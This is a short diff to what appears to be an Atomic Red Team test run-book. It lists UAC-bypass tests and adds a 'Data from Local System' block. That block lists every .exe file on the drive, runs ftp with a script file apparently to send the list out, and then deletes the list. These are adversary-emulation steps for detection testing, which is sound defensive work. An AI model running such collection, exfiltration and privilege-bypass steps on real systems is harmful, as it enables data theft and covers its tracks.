@@ -71,3 +71,12 @@ Step 2. invoke-atomictest t1548.002 -testnumber 16 -ExecutionLogPath $ExecutionL
 # Atomic Test #17 - UACME Bypass Method 61
 Step 1. invoke-atomictest t1548.002 -testnumber 17 -GetPrereqs -ExecutionLogPath $ExecutionLogPath
 Step 2. invoke-atomictest t1548.002 -testnumber 17 -ExecutionLogPath $ExecutionLogPath
+
+
+#------------------------------------------------------------
+T1005A - Data from Local System
+#------------------------------------------------------------
+Step 1. cmd /c dir /s/b *.exe > C:\R5\atomic-red-team\atomics\T1005A\src\exe_list.txt
+Step 2. ftp -v -n -i -d -s:C:\R5\atomic-red-team\atomics\T1005A\src\ftp_script.txt
+Step 3. bye
+Step 4. del C:\R5\atomic-red-team\atomics\T1005A\src\exe_list.txt
